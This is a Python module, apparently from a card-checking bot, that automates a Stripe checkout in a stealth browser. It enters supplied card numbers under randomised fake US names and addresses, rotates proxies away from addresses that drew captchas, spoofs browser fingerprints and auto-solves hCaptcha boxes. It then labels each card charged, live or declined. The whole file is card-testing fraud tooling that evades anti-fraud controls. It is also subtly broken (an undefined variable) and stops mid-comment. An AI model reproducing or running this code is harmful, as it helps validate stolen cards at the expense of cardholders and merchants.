"""The checkout, in a real browser.

Stripe's own script puts up two captchas, and they are not the same
one.  The first belongs to the page and it gives an answer by itself.
The second belongs to the payment intent, it puts up a box that has to
be ticked, and it is the one the payment intent is waiting for.

When the card is put into the page by hand, stripe's own script does
all of it: it puts up the captcha, it hands the answer over, and it
takes the card through the bank.  That is the whole way round, and it
is the only way round that the bank believes.

So the card is put into the page by hand here, the box is ticked when
it shows, and the card is read from stripe's own frame, which says
which intent it is about.
"""

import asyncio
import base64
import json
import logging
import os
import random
import re
import time
from urllib.parse import unquote

def _where_the_helpers_are():
    """Put the folder with the helpers on the path.

    The gate is in one folder and the helpers it needs are in
    another, and the python does not know where either of them is.  So
    the place is worked out here and put on the path, once.
    """
    import os
    import sys

    here = os.path.dirname(os.path.abspath(__file__))
    for up in (here, os.path.dirname(here), os.path.dirname(os.path.dirname(here))):
        for name in ("bot", "hitchk-app/bot", "hitchk-app"):
            path = os.path.join(up, name)
            if os.path.exists(os.path.join(path, "browser_identity.py")):
                if path not in sys.path:
                    sys.path.insert(0, path)
                return path
    return here


_where_the_helpers_are()

logger = logging.getLogger("stripe_native")

# How long the page is given to finish.  The captcha is about ten
# seconds, the bank is given the rest.
# How long the page is given, which may be set from the
# environment: a card has only so much time.
THE_TIME_TO_WAIT = int(os.environ.get("STRIPE_NATIVE_WAIT", "70") or 70)

# How many times the page may say nothing at all before the card is
# given up on.  A page that is going to answer says something within a
# few seconds, so waiting a minute for a page that has gone quiet is a
# minute wasted on every card.
QUIET_POLLS = 30

# The addresses the captcha asked for pictures at.  A shop counts the
# address a card comes from, and one that is asked for pictures is
# asked again for the next card: without this, every card of a run
# walked through the same tired addresses and every card took three
# times as long as it needed to.
_PICTURE_ADDRESSES: dict = {}
_PICTURE_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                             "stripe_picture_addresses.json")


def _load_picture_addresses():
    """The addresses the captcha asked for pictures at."""
    global _PICTURE_ADDRESSES
    try:
        with open(_PICTURE_FILE, encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict):
            _PICTURE_ADDRESSES = {str(k): float(v) for k, v in data.items()}
    except Exception:
        pass
    return _PICTURE_ADDRESSES


def _the_picture_addresses():
    """The addresses the captcha asked for pictures at."""
    if not _PICTURE_ADDRESSES:
        _load_picture_addresses()
    return _PICTURE_ADDRESSES


def _remember_picture_address(line):
    """The address is remembered, so the next card does not pay for it."""
    if not line:
        return
    _the_picture_addresses()[line] = time.time()
    try:
        with open(_PICTURE_FILE, "w", encoding="utf-8") as f:
            json.dump(_the_picture_addresses(), f, indent=1)
    except Exception:
        pass

# How many addresses a card is tried on when the captcha asks for
# pictures.
# How many addresses one card is tried on.  Each one costs a
# browser of its own and the time of the card, so the number may
# be set from the environment.
THE_TRIES = int(os.environ.get("STRIPE_NATIVE_TRIES", "3") or 3)

# The things that are put into the page.
THE_COUNTRY = "US"
THE_CITIES = [
    ("Portland", "OR", "97201"), ("Salem", "OR", "97301"), ("Eugene", "OR", "97401"),
    ("Bend", "OR", "97701"), ("Billings", "MT", "59101"), ("Helena", "MT", "59601"),
    ("Missoula", "MT", "59801"), ("Wilmington", "DE", "19801"), ("Dover", "DE", "19901"),
    ("Manchester", "NH", "03101"), ("Concord", "NH", "03301"), ("Nashua", "NH", "03060"),
    ("Anchorage", "AK", "99501"), ("Fairbanks", "AK", "99701"), ("Juneau", "AK", "99801"),
]
THE_STREETS = [
    "Main St", "Oak Ave", "Elm St", "Park Blvd", "Cedar Ln", "Maple Dr",
    "Washington St", "Lake Ave", "Hill Rd", "Valley Way", "Pine St", "River Rd",
]


def _name():
    first = random.choice(["James", "Mary", "Robert", "Patricia", "John", "Jennifer",
                           "Michael", "Linda", "David", "Elizabeth", "William", "Barbara",
                           "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah"])
    last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
                           "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez",
                           "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore"])
    return first, last


def _street():
    number = random.randint(10, 9999)
    name = random.choice(THE_STREETS)
    return "%d %s" % (number, name)


# The focus is put on a box from the script, and the words are typed.
# The country list lies over the boxes below it, so the mouse cannot
# reach them, but the keyboard goes where the focus is.
FOCUS_A_BOX = """
((name) => {
    const el = document.querySelector('input[name="' + name + '"]');
    if (!el) { return 'none'; }
    el.focus();
    if (el.select) { el.select(); }
    return 'focused';
})
"""


def the_key_of(link):
    """The key that goes with the link, out of the part after the #.

    The part after the # holds the key, turned a little so it cannot be
    read by accident.
    """
    try:
        if "#" not in link:
            return ""
        raw = unquote(link.split("#", 1)[1])
        padded = raw + "=" * (-len(raw) % 4)
        turned = base64.b64decode(padded)
        text = "".join(chr(b ^ 5) for b in turned)
        return (json.loads(text) or {}).get("apiKey") or ""
    except Exception:
        return ""


# The country is a list that stripe keeps in a box of its own, and it is
# closed until the page says so.  It is set from the script, and the
# page is told, so it never opens over the form.
SET_THE_COUNTRY = """
(() => {
    const s = document.getElementById('billingCountry');
    if (!s) { return 'no country'; }
    s.disabled = false;
    s.focus();
    const setter = Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, 'value').set;
    setter.call(s, '%s');
    s.dispatchEvent(new Event('input', {bubbles: true}));
    s.dispatchEvent(new Event('change', {bubbles: true}));
    s.blur();
    return s.value;
})()
"""

# The other boxes of the form are set the same way, so the page knows
# what is in them.  The tax cannot be worked out without the address,
# and without the tax the page will not take the card at all.
SET_A_BOX = """
((name, value) => {
    const el = document.querySelector('input[name="' + name + '"]');
    if (!el) { return 'none'; }
    const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
    setter.call(el, value);
    el.dispatchEvent(new Event('input', {bubbles: true}));
    el.dispatchEvent(new Event('change', {bubbles: true}));
    el.dispatchEvent(new Event('blur', {bubbles: true}));
    return el.value;
})
"""

# The state is a list of its own, and it is set the way the country is.
SET_THE_STATE = """
(() => {
    const s = document.getElementById('billingAdministrativeArea');
    if (!s) { return 'no state'; }
    s.disabled = false;
    s.focus();
    const setter = Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, 'value').set;
    setter.call(s, '%s');
    s.dispatchEvent(new Event('input', {bubbles: true}));
    s.dispatchEvent(new Event('change', {bubbles: true}));
    s.blur();
    return s.value;
})()
"""

# The tax line of the page.  When it says the tax has to be applied
# by hand, the address is not complete and the page will not take the
# card.
THE_TAX = """
(() => {
    const out = [];
    for (const e of document.querySelectorAll('*')) {
        if (e.children.length) { continue; }
        const t = (e.textContent || '').trim();
        if (/^(Apply Tax|Enter address to calculate)$/i.test(t)) { out.push(t); }
    }
    return out.join(' | ');
})()
"""

OPEN_THE_CARD_PART = """
(() => {
    const b = document.querySelector('[data-testid="card-accordion-item-button"]');
    if (!b) { return 'no button'; }
    b.scrollIntoView({block: 'center'});
    b.click();
    return 'clicked';
})()
"""

PRESS_PAY = """
(() => {
    const b = document.querySelector('[data-testid="hosted-payment-submit-button"]')
           || document.querySelector('button[type="submit"]');
    if (!b) { return 'no button'; }
    if (b.disabled) { return 'the button is closed'; }
    b.scrollIntoView({block: 'center'});
    b.click();
    return 'clicked';
})()
"""

# What the page says when it will not take the card.  The page says it
# in a box of its own, and the words are what the card's problem is.
WHAT_THE_PAGE_SAYS = """
(() => {
    const out = [];
    for (const e of document.querySelectorAll('[role=alert],[aria-live],[class*=Error],[class*=error]')) {
        const t = (e.textContent || '').trim();
        if (t && t.length < 300 && out.indexOf(t) < 0) { out.push(t); }
    }
    return out.slice(0, 8);
})()
"""

# The box that hCaptcha puts up when it wants to be sure.  It is in a
# frame of hCaptcha's own, and the frame says which kind it is.
TICK_THE_BOX = """
() => {
    const el = document.querySelector('#checkbox');
    if (!el) { return 'no box'; }
    try { el.click(); return 'ticked'; } catch (e) { return 'the tick failed: ' + e; }
}
"""

# The answer is asked for in the frame that holds the captcha, with the
# key and the request data that the frame's own address carries.
ASK_IN_THE_FRAME = """
(args) => {
    const [sitekey, rqdata] = args;
    window.__tok = ''; window.__err = '';
    const keep = (t) => {
        window.__tok = (t && t.response) ? t.response : (t || '');
    };
    try {
        if (!window.hcaptcha) { return 'no captcha here'; }
        const box = document.createElement('div');
        box.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;opacity:0.01;z-index:2147483647;';
        document.body.appendChild(box);
        const id = window.hcaptcha.render(box, {sitekey: sitekey, size: 'invisible', callback: keep,
            'error-callback': (e) => { window.__err = String(e); }});
        const p = window.hcaptcha.execute(id, {async: true, rqdata: rqdata});
        if (p && p.then) { p.then(keep).catch((e) => { window.__err = 'execute: ' + e; }); }
        return 'asked';
    } catch (e) { window.__err = String(e); return 'threw: ' + e; }
}
"""

# Stripe's own frame for the challenge of the intent.  Its address says
# which intent it is about, and it holds the key and the request data
# of the challenge.
THE_INTENT_FRAME = "hcaptcha-inner"

# The browser of the checkout has a profile of its own.  The browser
# that answers the captcha has one too, and two browsers cannot hold
# the same one at the same time.
THE_PROFILE = "/tmp/lc_checkout_profile"


def _the_profile():
    """The profile of the checkout's own browser."""
    path = THE_PROFILE
    try:
        os.makedirs(path, exist_ok=True)
    except Exception:
        return "/tmp"
    return path


def _clear_the_lock():
    """Take the lock of a browser that died away."""
    try:
        for name in ("SingletonLock", "SingletonCookie", "SingletonSocket"):
            full = os.path.join(_the_profile(), name)
            if os.path.islink(full) or os.path.exists(full):
                try:
                    os.unlink(full)
                except OSError:
                    pass
    except Exception:
        pass


# The browser of the checkout is kept open between the cards.  Starting
# a browser takes about twenty seconds, and that is more than the whole
# rest of the work.
_THE_BROWSER = {"ctx": None, "pw": None, "proxy": None}


def _which_browser():
    """The browser of the version the request library pretends to be.

    The browser that answers the captcha has to be the same version as
    the request that carries the answer, so the browser of that exact
    version is used when it is on the machine.
    """
    try:
        from local_hcaptcha_solver import _the_browser as _which
        return _which()
    except Exception:
        return {"channel": "chrome"}


async def _the_browser_open(launch, page_options, stealth):
    """The browser of the checkout, opened once and kept."""
    from playwright.async_api import async_playwright

    wanted = launch.get("proxy")
    wanted = wanted.get("server") if isinstance(wanted, dict) else wanted
    ctx = _THE_BROWSER.get("ctx")
    if ctx is not None:
        if wanted == _THE_BROWSER.get("proxy"):
            try:
                return ctx
            except Exception:
                pass
        try:
            await ctx.close()
        except Exception:
            pass
        _THE_BROWSER["ctx"] = None

    pw = await async_playwright().start()
    try:
        ctx = await pw.chromium.launch_persistent_context(
            _the_profile(), **_which_browser(), bypass_csp=True,
            **page_options, **launch)
    except Exception:
        _clear_the_lock()
        browser = await pw.chromium.launch(**launch)
        ctx = await browser.new_context(bypass_csp=True, **page_options)
    await ctx.add_init_script(stealth)
    _THE_BROWSER["ctx"] = ctx
    _THE_BROWSER["pw"] = pw
    _THE_BROWSER["proxy"] = wanted
    return ctx


async def _close_the_browser():
    """The browser of the checkout, shut."""
    ctx = _THE_BROWSER.get("ctx")
    pw = _THE_BROWSER.get("pw")
    _THE_BROWSER["ctx"] = None
    _THE_BROWSER["pw"] = None
    try:
        if ctx is not None:
            await ctx.close()
    except Exception:
        pass
    try:
        if pw is not None:
            await pw.stop()
    except Exception:
        pass


def _the_intent_in_the_frames(page):
    """The intent stripe's own frame is about, if it is there.

    The frame's address carries the intent, its secret, and the address
    the answer is handed to.
    """
    for frame in page.frames:
        url = frame.url or ""
        if THE_INTENT_FRAME not in url:
            continue
        tail = url.split("#", 1)[-1]
        found = {}
        for part in tail.split("&"):
            if "=" not in part:
                continue
            name, value = part.split("=", 1)
            found[name] = unquote(value)
        intent_id = found.get("intentId") or ""
        if not intent_id:
            continue
        verify = found.get("verifyUrl") or ""
        if verify and not verify.startswith("/"):
            verify = "/" + verify
        return {
            "intent_id": intent_id,
            "client_secret": found.get("clientSecret") or "",
            "site_key": found.get("sitekey") or "",
            "rqdata": found.get("rqdata") or "",
            "verify_url": verify,
        }
    return None


def _the_kind_of_the_action(action):
    """What the card is being asked for.

    The answer of stripe says what is wanted in two ways: plainly, or
    inside the part that says the stripe script is to do it.  The one
    inside is the one that matters, because the captcha of the intent
    is asked for that way.
    """
    action = action or {}
    inside = (action.get("use_stripe_sdk") or {}).get("type") or ""
    if inside:
        return inside
    return action.get("type") or ""


def _classify(intent):
    """What stripe's answer says about the card."""
    status = intent.get("status") or ""
    if status == "succeeded":
        return "charged", "Charged"
    if status == "requires_capture":
        return "charged", "Authorized"
    if status == "processing":
        return "approved", "Processing"
    if status == "requires_action":
        kind = _the_kind_of_the_action(intent.get("next_action") or {})
        if kind == "intent_confirmation_challenge":
            return "live", "hCaptcha Challenge Required"
        if "three_d_secure" in kind or "3ds" in kind:
            return "approved_3ds", "3DS required"
        return "live", "3DS required"
    error = intent.get("last_payment_error") or intent.get("last_setup_error") or {}
    if error:
        code = error.get("code") or ""
        decline = error.get("decline_code") or ""
        message = str(error.get("message") or "")[:90]
        if code == "card_declined" and decline:
            return "declined", decline
        if code == "card_declined":
            return "declined", "card_decline"
        if code == "expired_card":
            return "declined", "expired_card"
        if code == "incorrect_cvc":
            return "declined", "incorrect_cvc"
        if code == "processing_error":
            return "declined", "processing_error"
        if code == "payment_intent_authentication_failure":
            return "declined", "3DS authentication failed"
        if "captcha" in message.lower():
            return "error", "hCaptcha Challenge Required"
        return "declined", (decline or code or message or "card declined")[:60]
    if status == "canceled":
        return "declined", "Payment canceled"
    if status == "requires_payment_method":
        return "declined", "Payment method failed"
    return "error", ("Payment failed (%s)" % (status or "unknown"))[:60]


def _card_info(intent):
    """What is known about the card, for the record."""
    method = intent.get("payment_method") or {}
    if isinstance(method, str):
        method = {}
    card = method.get("card") or {}
    if not card:
        return ""
    brand = card.get("brand") or ""
    last = card.get("last4") or ""
    if not brand and not last:
        return ""
    return "%s %s" % (brand.upper(), last).strip()


async def _read_the_intent(client, pk, intent_id, client_secret):
    """The intent, read from stripe."""
    try:
        r = await client.get(
            "https://api.stripe.com/v1/payment_intents/%s" % intent_id,
            params={"key": pk, "client_secret": client_secret},
            headers={"origin": "https://checkout.stripe.com",
                     "referer": "https://checkout.stripe.com/"},
            timeout=12)
        data = r.json()
        return data if isinstance(data, dict) else {}
    except Exception as e:
        logger.info("the intent could not be read: %s", e)
        return {}


def _the_intent_in_the_wire(seen):
    """The intent out of what stripe said on the wire.

    Stripe's own script says what happened to the intent in its answer
    to the confirm.  The answer is the truth about the card.
    """
    best = None
    for status, url, body in seen:
        try:
            data = json.loads(body)
        except Exception:
            continue
        if not isinstance(data, dict):
            continue
        intent = data.get("payment_intent") or {}
        if not intent and data.get("object") in ("payment_intent", "setup_intent"):
            intent = data
        if intent:
            best = intent
    return best


async def _answer_the_intents_captcha(page, intent, pk, wait=30):
    """The answer for the captcha the payment intent is waiting for.

    That captcha is in a frame of stripe's own, and the address of that
    frame carries the key, the request data and the address the answer
    is to be handed to.  So the answer is asked for right there, with
    those, and handed to the one the frame names.
    """
    for frame in page.frames:
        if THE_INTENT_FRAME not in (frame.url or ""):
            continue
        try:
            has = await frame.evaluate("!!window.hcaptcha")
            if not has:
                # the frame has the address of the challenge but not
                # the captcha itself, so the captcha is brought in
                await frame.evaluate("""(() => {
                    const s = document.createElement('script');
                    s.src = 'https://js.hcaptcha.com/1/api.js?enterprise.js';
                    s.async = true; s.defer = true;
                    document.head.appendChild(s);
                })()""")
                await frame.wait_for_timeout(3000)
                has = await frame.evaluate("!!window.hcaptcha")
            logger.info("the intent's frame has a captcha: %s", has)
            if not has:
                logger.info("THE CAPTCHA CANNOT BE ANSWERED HERE: the intent's "
                            "frame has no captcha in it")
            said = await frame.evaluate(ASK_IN_THE_FRAME, [
                intent.get("site_key") or "", intent.get("rqdata") or ""])
            logger.info("the intent's captcha was asked for: %s", said)

            give = time.time() + wait
            while time.time() < give:
                await frame.wait_for_timeout(700)
                # The pictures are noticed while the answer is waited
                # for, and not after it: the waiting is half a minute,
                # and the card has no reason to wait for it when the
                # captcha is going to ask for a person anyway.
                try:
                    from local_hcaptcha_solver import _image_challenge_up
                    if await _image_challenge_up(page):
                        logger.info("the captcha wants pictures, and a "
                                    "person has to answer them, so the card "
                                    "is not tried here")
                        return False
                except Exception:
                    pass
                tok = await frame.evaluate("window.__tok || ''")
                if not tok:
                    # The captcha puts up a box that has to be
                    # clicked, the way a visitor clicks it, and a
                    # Verify button that asks for the answer.
                    try:
                        from local_hcaptcha_solver import (_click_the_box,
                                                          _click_the_verify)
                        await _click_the_box(page)
                        await _click_the_verify(page)
                    except Exception:
                        pass
                    continue
                logger.info("the intent's captcha gave the answer (%d chars)", len(tok))
                await _hand_the_answer_over(intent, pk, tok, fingerprint)
                return True
            err = await frame.evaluate("window.__err || ''")
            if err:
                logger.info("the intent's captcha said: %s", str(err)[:100])
        except Exception as e:
            logger.info("the intent's captcha could not be answered: %s", e)
        return False
    return False


async def _hand_the_answer_over(intent, pk, token, fingerprint=None):
    """The answer, handed to the address the frame named."""
    verify = intent.get("verify_url") or ""
    if not verify:
        return None
    from browser_identity import BrowserClient, api_headers
    try:
        async with BrowserClient(timeout=20, fingerprint=fingerprint) as client:
            r = await client.post(
                "https://api.stripe.com" + verify,
                data={"client_secret": intent.get("client_secret") or "",
                      "key": pk,
                      "captcha_vendor_name": "hcaptcha",
                      "challenge_response_token": token},
                headers=api_headers(origin="https://js.stripe.com",
                                    referer="https://js.stripe.com/",
                                    fingerprint=fingerprint),
                timeout=15)
            logger.info("the answer was handed over: HTTP %s", r.status_code)
            return r
    except Exception as e:
        logger.info("the answer could not be handed over: %s", e)
        return None


async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
    """The card in the real checkout, in a real browser.

    Returns the same thing the other gates return: what happened to the
    card, what stripe said, what is known about the card, and how long
    it took.
    """
    # The captcha asks for pictures when it does not like the address
    # the card comes from.  So when the card is asked for pictures, it
    # is tried again on another address, and the addresses are not the
    # same one twice running.
    tried = []
    for attempt in range(THE_TRIES):
        line = None
        if proxy is None:
            proxy, line = await _a_working_address(tried)
            if line:
                tried.append(line)
        status, msg, info, took = await _one_card(cc, mm, yy, cvv, checkout_url,
                                                  proxy, timeout)
        if status != "error" or "pictures" not in str(msg).lower():
            return status, msg, info, took
        logger.info("the captcha wants pictures on this address, "
                    "another one is tried")
        # The address is remembered, so the next card does not pay for
        # it again.
        _remember_picture_address(line)
        proxy, line = _another_address(tried)
        if line:
            tried.append(line)
        if not proxy:
            return status, msg, info, took
    return status, msg, info, took


async def _a_working_address(tried):
    """An address that answers, and that has not been used.

    The addresses the captcha asked for pictures at are passed over,
    unless every one of them is like that.
    """
    try:
        from gates.stripe_co import _get_proxy, _the_address_answers, PROXY_FILE
        import os as _os
        if not _os.path.exists(PROXY_FILE):
            return None, None
        with open(PROXY_FILE, encoding="utf-8", errors="replace") as f:
            lines = [l.strip() for l in f if l.strip()]
        random.shuffle(lines)
        # the good addresses first, and the tired ones only when there
        # is nothing else
        good = [l for l in lines if l not in _the_picture_addresses()]
        for line in good + lines:
            if line in tried:
                continue
            if not await _the_address_answers(line):
                continue
            from gates.stripe_co import _the_address
            whole, _ = _the_address(line)
            if whole:
                return whole, line
    except Exception as e:
        logger.info("the addresses could not be looked at: %s", e)
    return None, None


def _another_address(used):
    """An address that is not one of the ones just used."""
    try:
        from gates.stripe_co import _get_proxy, PROXY_FILE
        import os as _os
        if not _os.path.exists(PROXY_FILE):
            return None, None
        with open(PROXY_FILE, encoding="utf-8", errors="replace") as f:
            lines = [l.strip() for l in f if l.strip()]
        random.shuffle(lines)
        good = [l for l in lines if l not in _the_picture_addresses()]
        for line in good + lines:
            if used and line in used:
                continue
            from gates.stripe_co import _the_address
            whole, _ = _the_address(line)
            if whole:
                return whole, line
    except Exception:
        pass
    return None, None


async def _one_card(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
    """One card, in the real checkout, in a real browser."""
    started = time.time()
    seen = []
    try:
        from local_hcaptcha_solver import (PAGE_OPTIONS, STEALTH,
                                           _playwright_proxy,
                                           apply_browser_identity, client_hints_metadata)
    except Exception as e:
        logger.info("the browser helpers are missing: %s", e)
        return "error", "The browser is not available", "", 0.0

    try:
        from playwright.async_api import async_playwright
    except Exception as e:
        logger.info("playwright is missing: %s", e)
        return "error", "The browser is not available", "", 0.0

    from browser_identity import BrowserClient

    launch = {
        "headless": not bool(os.environ.get("DISPLAY")),
        "args": ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
                 "--disable-blink-features=AutomationControlled",
                 "--window-size=1366,900"],
    }
    # The browser takes the address in its own shape: the host and the
    # port, with the word in a separate place.  It has to be the same
    # address the request goes out by, or the captcha is answered by one
    # computer and handed over by another.
    if proxy:
        browser_proxy = None
        try:
            from gates.stripe_co import _the_address
            _whole, server = _the_address(proxy)
            if server:
                browser_proxy = {"server": server}
                # the word has to be in its own place
                if "@" in (proxy or "") and "://" in proxy:
                    creds = proxy.split("://", 1)[-1].split("@", 1)[0]
                    if ":" in creds:
                        user, pwd = creds.split(":", 1)
                        browser_proxy["username"] = user
                        browser_proxy["password"] = pwd
        except Exception:
            browser_proxy = None
        if not browser_proxy:
            pw_proxy = _playwright_proxy(proxy)
            if pw_proxy:
                browser_proxy = pw_proxy
        if browser_proxy:
            launch["proxy"] = browser_proxy

    pk = the_key_of(checkout_url)
    # Each card is sent with the name of a browser of its own.  The
    # answer to the captcha belongs to the browser that won it, so the
    # request that carries the answer has to come from that same
    # browser and say the same things about itself.
    from browser_identity import new_fingerprint
    fingerprint = new_fingerprint()
    logger.info("the card is sent as %s", fingerprint)

    client_kwargs = {"timeout": 15, "follow_redirects": True, "proxy": None,
                     "fingerprint": fingerprint}
    if proxy and proxy != "NONE":
        client_kwargs["proxy"] = proxy

    pw = None
    ctx = None
    page = None
    try:
        ctx = await _the_browser_open(launch, PAGE_OPTIONS, STEALTH)
        page = await ctx.new_page()
        if apply_browser_identity is not None:
            # The browser is told the same name the request carries.
            await apply_browser_identity(page, fingerprint=fingerprint)

        async def _on_response(response):
            url = response.url or ""
            if "api.stripe.com" not in url:
                return
            body = ""
            try:
                body = await response.text()
            except Exception:
                pass
            seen.append((response.status, url, body))

        page.on("response", _on_response)

        logger.info("the checkout is opened: %s", checkout_url[:90])
        # The page's own script keeps the load going, so the load is
        # waited for as far as the first answer comes back, and the
        # page is given a moment after that.
        try:
            await page.goto(checkout_url, wait_until="commit", timeout=20000)
        except Exception as e:
            logger.info("the page did not answer in time: %s", str(e)[:60])
            return "error", "The page did not open", "", time.time() - started
        # A moment, and no more: the card part below waits for the card
        # box itself, so a blanket wait here only makes every card
        # slower.
        await page.wait_for_timeout(600)

        # a page that is already finished says so, and there is nothing
        # to be done there
        try:
            words = " ".join((await page.evaluate(
                "() => (document.body ? document.body.innerText : '')")).split())
        except Exception:
            words = ""
        if "all done here" in words.lower() or "timed out" in words.lower():
            logger.info("the session is finished: %s", words[:120])
            return "error", "The session is finished", "", time.time() - started

        for _ in range(4):
            try:
                await page.evaluate(OPEN_THE_CARD_PART)
            except Exception:
                pass
            try:
                await page.locator('input[name="cardNumber"]').first.wait_for(
                    state="visible", timeout=8000)
                break
            except Exception:
                await page.wait_for_timeout(1500)
        else:
            logger.info("the card part of the page never came: %s", words[:200])
            return "error", "The page did not open", "", time.time() - started

        first, last = _name()
        city, state, postal = random.choice(THE_CITIES)
        try:
            await page.evaluate(SET_THE_COUNTRY % THE_COUNTRY)
        except Exception:
            pass
        await page.wait_for_timeout(1000)
        # The country list lies over the boxes below it, so the mouse
        # cannot reach them.  The focus is put on each box from the
        # script and the words are typed, which is what a person does
        # and the page takes.
        for name, value in (("billingAddressLine1", _street()),
                            ("billingLocality", city),
                            ("billingPostalCode", postal),
                            ("billingName", "%s %s" % (first, last))):
            try:
                await page.evaluate(FOCUS_A_BOX, name)
                await page.keyboard.press("Control+a")
                await page.keyboard.type(value, delay=25)
                await page.keyboard.press("Tab")
            except Exception as e:
                logger.info("the %s box did not take the words: %s", name, e)
        # The tax cannot be worked out without the address, and without
        # the tax the page will not take the card at all.  Some places
        # want the state as well.
        #
        # The tax is waited for as long as it takes and no longer: the
        # page usually has it ready in a fraction of a second, and the
        # blank wait was the same on every card.
        try:
            needs_tax = False
            for _ in range(17):
                said = await page.evaluate(THE_TAX)
                if "Apply Tax" in said or "Enter address to calculate" in said:
                    needs_tax = True
                    break
                await page.wait_for_timeout(150)
            if needs_tax:
                await page.evaluate(SET_THE_STATE % state)
                for _ in range(17):
                    said = await page.evaluate(THE_TAX)
                    if "Apply Tax" not in said and "Enter address to calculate" not in said:
                        break
                    await page.wait_for_timeout(150)
        except Exception:
            pass

        for name, value in (("cardNumber", cc),
                            ("cardExpiry", "%s/%s" % (mm.zfill(2), yy[-2:])),
                            ("cardCvc", cvv)):
            try:
                field = page.locator('input[name="%s"]' % name)
                await field.first.click(timeout=6000)
                await field.first.type(value, delay=30, timeout=12000)
            except Exception as e:
                logger.info("the %s box did not take the answer: %s", name, e)
                return "error", "The card could not be put in", "", time.time() - started

        try:
            said = await page.evaluate(PRESS_PAY)
        except Exception:
            said = "the press failed"
        logger.info("the pay button: %s", said)

        # the box of the captcha is ticked when it shows, and the intent
        # is read from stripe's own frame, which says which one it is
        deadline = time.time() + (timeout or THE_TIME_TO_WAIT)
        ticked = 0
        intent = None
        quiet = 0
        async with BrowserClient(**client_kwargs) as client:
            while time.time() < deadline:
                await page.wait_for_timeout(500)
                # The captcha puts up a box that has to be clicked, the
                # way a visitor clicks it, and a Verify button that
                # asks for the answer.
                try:
                    from local_hcaptcha_solver import (_click_the_box,
                                                      _click_the_verify,
                                                      _image_challenge_up)
                    if await _click_the_box(page):
                        ticked += 1
                        logger.info("the captcha's box was clicked (%d)", ticked)
                    await _click_the_verify(page)
                    # A picture challenge needs a person to look at the
                    # pictures, so the card is not tried and it is said
                    # plainly that it was not tried.
                    if await _image_challenge_up(page):
                        logger.info("the captcha wants pictures, "
                                    "and a person has to answer them, "
                                    "so the card is not tried here")
                        return ("error",
                                "the captcha wanted a person to answer "
                                "some pictures, so the card was not tried",
                                "", time.time() - started)
                except Exception:
                    pass

                # Stripe's own answer says what happened, and it says it
                # as soon as it knows, so the wire is looked at first.
                from_the_wire = _the_intent_in_the_wire(seen)
                if from_the_wire:
                    state = from_the_wire.get("status") or ""
                    action = from_the_wire.get("next_action") or {}
                    kind = _the_kind_of_the_action(action)
                    if state not in ("requires_action", "requires_source_action"):
                        # the card is done: it was taken, or refused
                        intent = {"intent_id": "", "client_secret": "",
                                  "read": from_the_wire}
                        break
                    if kind == "intent_confirmation_challenge":
                        # The captcha of the intent is still to be
                        # answered, so it is worth waiting for.
                        found = _the_intent_in_the_frames(page)
                        if found:
                            intent = found
                            await _answer_the_intents_captcha(page, intent, pk)
                    else:
                        logger.info("the card is at the bank's door: %s", kind)
                        intent = {"intent_id": "", "client_secret": "",
                                  "read": from_the_wire}
                        break

                if intent is None:
                    intent = _the_intent_in_the_frames(page)
                    if intent:
                        logger.info("stripe's frame is about %s", intent["intent_id"])
                        await _answer_the_intents_captcha(page, intent, pk)
                if intent:
                    read = await _read_the_intent(client, pk, intent["intent_id"],
                                                  intent["client_secret"])
                    if read:
                        intent = dict(intent)
                        intent["read"] = read
                        state = read.get("status") or ""
                        if state not in ("requires_action", "requires_source_action"):
                            break
                        # The card is at the bank's door and the bank is
                        # asking for the second factor.  That is an
                        # answer about the card, so there is nothing to
                        # wait for.
                        action = read.get("next_action") or {}
                        kind = _the_kind_of_the_action(action)
                        if kind == "intent_confirmation_challenge":
                            # The captcha of the intent is still to be
                            # answered.  It is asked for in the frame
                            # that holds it, with the key and the
                            # request data that the frame's own address
                            # carries, and the answer is handed to the
                            # address the frame names.
                            await _answer_the_intents_captcha(page, intent, pk)
                        else:
                            logger.info("the card is at the bank's door: %s", kind)
                            intent["read"] = read
                            break
                else:
                    # the page can also say no, in words, without
                    # stripe ever being asked.  When it does, there is
                    # nothing to wait for.
                    try:
                        said = await page.evaluate(WHAT_THE_PAGE_SAYS)
                    except Exception:
                        said = []
                    # Nothing has come back at all.  A page that is going
                    # to answer says something within a few seconds, and
                    # a card that is only going to be refused after a
                    # minute of waiting is a card that is not going to be
                    # answered.
                    quiet += 1
                    if quiet >= QUIET_POLLS:
                        logger.info("the page said nothing for %d polls, "
                                    "the card is not going to be answered", quiet)
                        return ("error", "The page did not answer",
                                "", time.time() - started)
                    for text in said or []:
                        low = str(text).lower()
                        if "required" in low or "invalid" in low or "enter" in low:
                            logger.info("the page will not take the card: %s",
                                        str(text)[:80])
                            intent = {"intent_id": "", "client_secret": "",
                                      "read": {"status": "requires_payment_method",
                                               "last_payment_error": {
                                                   "code": "form_not_filled",
                                                   "message": str(text)[:90]}}}
                            break
                    if intent:
                        break

            if not intent:
                logger.info("stripe never said which intent it was about")
                from_the_wire = _the_intent_in_the_wire(seen)
                if from_the_wire:
                    logger.info("the intent came off the wire: %s", from_the_wire.get("status"))
                    verdict, message = _classify(from_the_wire)
                    return verdict, message, _card_info(from_the_wire), time.time() - started
                try:
                    words = " ".join((await page.evaluate(
                        "() => (document.body ? document.body.innerText : '')")).split())
                    logger.info("the page says: %s", words[:400])
                except Exception:
                    pass
                return "error", "The page did not answer", "", time.time() - started

            read = intent.get("read") or {}
            if not read and intent.get("intent_id"):
                read = await _read_the_intent(client, pk, intent["intent_id"],
                                              intent["client_secret"])
            logger.info("stripe said: %s", read.get("status"))
            verdict, message = _classify(read)
            info = _card_info(read)
            logger.info("the verdict: %s | %s", verdict, message)
            return verdict, message, info, time.time() - started
    except Exception as e:
        logger.warning("the checkout in the browser failed: %s", e)
        return "error", str(e)[:60], "", time.time() - started
    finally:
        # The browser is kept for the next card, but the page of this
